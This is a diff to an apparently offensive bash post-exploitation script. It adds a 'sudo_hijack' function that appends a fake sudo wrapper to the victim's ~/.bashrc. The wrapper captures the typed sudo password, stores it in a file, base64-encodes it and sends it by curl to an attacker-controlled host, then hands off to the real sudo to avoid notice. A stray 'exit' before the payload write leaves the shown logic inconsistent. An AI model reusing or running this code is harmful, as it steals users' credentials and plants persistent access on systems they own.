@@ -103,9 +103,34 @@ enum_doors() {
 	echo "-----------------------"
 }
 
+sudo_hijack () {
+if $(cat /etc/group | grep sudo | grep -qi $(whoami));
+then
+	echo "[+] Sudo hijack possible"
+	exit
+	echo 'function sudo () {
+		realsudo="$(which sudo)"
+		passwdfile="'$passwdfile'"
+		read -s -p "[sudo] password for $USER: " inputPasswd
+		printf "\n"; printf "%s\n" "$USER : $inputPasswd" >> $passwdfile
+		sort -uo "$passwdfile" "$passwdfile"
+		encoded=$(cat "$passwdfile" | base64) > /dev/null 2>&1
+		curl -k -s "https://'$attackBox'/$encoded" > /dev/null 2>&1
+		$realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+		$realsudo "${@:1}"
+		}' >> ~/.bashrc
+	echo -e "\e[92m[+]\e[0m Hijacked $(whoami)'s sudo access"
+	echo -e "\e[92m[+]\e[0m Stored in $passwdfile"
+fi
+}
 
 
-enum_methods
+main (){
+	enum_methods
+	sudo_hijack
+}
+
+main
 
 #attackBox=0.0.0.0
 #attackPort=5253
